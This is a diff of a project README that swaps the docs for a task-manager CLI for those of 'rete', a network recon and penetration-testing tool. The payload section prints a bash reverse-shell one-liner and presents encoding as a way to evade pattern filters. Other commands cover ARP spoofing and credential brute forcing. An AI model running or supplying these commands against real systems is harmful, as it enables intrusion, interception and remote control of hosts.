@@ -1,98 +1,137 @@
-#Placeholder pending revision
-
 ## Features:
-- 🗹 Create a task title and description that is stored in a database.
-- 🗹 Create a deadline for tasks to stay on top of your project timeline.
-- 🗹 Complete tasks to check them off.
-- 🗹 Delete tasks and completed tasks at will.
-- 🗹 Data storage via sqlite.
 
-## Planned Features:
--  Git integration.
--  Github task to issue.
--  File export and import.
+- **Reconnaissance & Discovery**
+  - Ping sweeps
+  - TCP/UDP port scanning
+  - OS fingerprinting
+  - Service version enumeration
+  - DNS lookup
+  - WHOIS lookup
+  - Subdomain enumeration
 
-## Usage Information:
+- **Network Diagnostics**
+  - Traceroute
+  - Bandwidth measurement
+  - Latency monitoring
+  - Packet loss checks
+  - MTU discovery
+  - ARP scanning
 
-Usage:
+- **Security & Penetration Testing**
+  - Packet sniffing
+  - Custom packet forging
+  - ARP spoofing
+  - Vulnerability scanning
+  - Credential brute forcing
+  - SSL/TLS auditing
 
-    munus [OPTIONS]
+- **Payload Delivery**
+  - Reverse shell payload generation
+  - File transfer helpers
+  - Bind shell setup
+  - Payload encoding
 
-    munus -t "Title" -d "Description" [-n DEADLINE]
+- **Feature Catalog Management**
+  - Browse available features
+  - Seed features from CSV
 
-Options:
+- **Job Tracking**
+  - Record CLI actions as jobs
+  - Track jobs in the TUI dashboard
 
-    munus        Run without arguments to enter the terminal user interface to input a task
+- **Interactive TUI**
+  - Launches a terminal UI when run without subcommands.
 
-    -t string    Title of the task (required, max 100 chars)
+## Core CLI capabilities
 
-    -d string    Description of the task (required, max 500 chars)
+Rete is organized into focused command groups:
 
-    -n string    Deadline for the task
-    
-    -list, -l    List all tasks in the terminal user interface
+ - rete recon — reconnaissance and discovery
+ - rete diag — network diagnostics
+ - rete sec — security and penetration testing
+ - rete payload — payload delivery helpers
+ - rete features — feature catalog browsing and seeding
+ - rete jobs — job tracking and status management
 
-    -help, -h    Show this help message
+### recon
 
-Deadline formats:
-
-    - Absolute: YYYY-MM-DD HH:MM (e.g., 2025-11-16 14:30)
-
-    - Relative units:
-
-        • m: minutes (30m = 30 minutes from now)
-
-        • h: hours (2h = 2 hours from now)
-
-        • d: days (1d = 1 day from now)
-
-        • w: weeks (2w = 2 weeks from now)
-
-        • M: months (1M = 1 month from now)
-
-    - Combinations: 2d 3h 30m (2days, 3hours, 30 minutes from now)
+ - rete recon ping-sweep — discover live hosts with ICMP echo requests
+ - rete recon port-scan — scan TCP or UDP ports on a target host
+ - rete recon os-finger — identify the remote host operating system
+ - rete recon service-enum — detect running services and versions
+ - rete recon dns — perform forward and reverse DNS resolution
+ - rete recon whois — query WHOIS data for a domain or IP address
+ - rete recon subdomain — enumerate subdomains via DNS brute force
 
 Examples:
-```
-munus -t "Meeting" -d "Team sync" -n "2025-11-20 14:00"
-```
-```    
-munus -t "Quick fix" -d "Bug #123" -n "2h"
-```
-```
-munus -t "Project" -d "Milestone 1" -n "1w 2d"
-```
-## Run with Docker:
+ - rete recon ping-sweep --target 192.168.1.0/24
+ - rete recon port-scan --target 10.0.0.1 --ports 1-1024 --proto tcp
+ - rete recon dns --target example.com
 
-### Build the image
+### diag
 
-```bash
-docker build -t munus:latest .
-```
+ - rete diag traceroute — trace the path packets take to a destination
+ - rete diag bandwidth — measure available bandwidth to a host
+ - rete diag latency — monitor round-trip latency over time
+ - rete diag packet-loss — measure packet loss percentage
+ - rete diag mtu — discover the maximum transmission unit on a path
+ - rete diag arp-scan — discover local network hosts via ARP
 
-### Run interactively (recommended for TUI)
+Examples:
+ - rete diag traceroute --target 8.8.8.8 --max-hops 30
+ - rete diag latency --target 8.8.8.8 --count 10 --interval 1
+ - rete diag arp-scan --iface eth0
 
-```bash
-docker run --rm -it \
-  -v munus-data:/app/data \
-  munus:latest
-```
+### sec
 
-This starts the TUI/CLI and persists your SQLite database in a Docker volume (`munus-data`).
+ - rete sec sniff — capture and inspect packets on a network interface
+ - rete sec forge — craft and inject custom network packets
+ - rete sec arp-spoof — poison ARP caches for MITM interception
+ - rete sec vuln-scan — scan for common vulnerabilities on a target
+ - rete sec brute — attempt credential brute force against a service
+ - rete sec tls-audit — audit SSL/TLS configuration on a remote host
 
-### Run CLI mode with flags
+ Examples:
+ - rete sec sniff --iface eth0 --filter 'tcp port 80' --count 50
+ - rete sec vuln-scan --target 10.0.0.1 --ports 22,80,443
+ - rete sec tls-audit --target example.com:443
 
-```bash
-docker run --rm -it \
-  -v munus-data:/app/data \
-  munus:latest -t "Meeting" -d "Team sync" -n "2h"
-```
+### payload
 
-### Show help
+ - rete payload rev-shell — generate reverse shell payload templates
+ - rete payload file-xfer — transfer files over TCP or HTTP channels
+ - rete payload bind-shell — set up a bind shell listener on a port
+ - rete payload encode — encode a payload to evade simple pattern filters
 
-```bash
-docker run --rm munus:latest -h
-```
+Examples:
+ - rete payload rev-shell --lhost 10.0.0.1 --lport 4444 --lang bash
+ - rete payload file-xfer --target 10.0.0.2 --file ./artifact.bin --mode http --port 8080
+ - rete payload encode --input 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' --encoder base64
+
+### features
+
+ - rete features list — list available features
+ - rete features seed — seed the feature catalog from a CSV file
+
+ Examples:
+ - rete features list
+ - rete features list --category 'Reconnaissance & Discovery'
+ - rete features seed --file table.csv
+
+### jobs
+
+- rete jobs list — list recent scan jobs
+- rete jobs show [job-id] — show details for a specific scan job
+
+Examples:
+
+ - rete jobs list
+ - rete jobs list --limit 50
+ - rete jobs show 7
+
+### Interactive TUI
+
+ - Running rete with no subcommand launches the terminal UI dashboard.
 
 ## Install:
 
@@ -100,33 +139,33 @@ Download the appropriate binary for your platform below and make it executable:
 
 Linux:
 ```
-chmod +x munus-linux-amd64
+chmod +x rete-linux-amd64
 ```
 ```
-sudo mv munus-linux-amd64 /usr/local/bin/munus
+sudo mv rete-linux-amd64 /usr/local/bin/rete
 ```
  or
 ```
-chmod +x munus-linux-arm64
+chmod +x rete-linux-arm64
 ```
 ```
-sudo mv munus-linux-arm64 /usr/local/bin/munus
+sudo mv rete-linux-arm64 /usr/local/bin/rete
 ```
 macOS:
 ```
-chmod +x munus-macos-arm64
+chmod +x rete-macos-arm64
 ```
 ```
-sudo mv munus-macos-arm64 /usr/local/bin/munus
+sudo mv rete-macos-arm64 /usr/local/bin/rete
 ```
   or
 ```
-chmod +x munus-macos-amd64
+chmod +x rete-macos-amd64
 ```
 ```
-sudo mv munus-macos-amd64 /usr/local/bin/munus
+sudo mv rete-macos-amd64 /usr/local/bin/rete
 ```
 Windows:
 ```
-Download munus-windows-amd64.exe and add it to your PATH as munus.
+Download rete-windows-amd64.exe and add it to your PATH as rete.
 ```
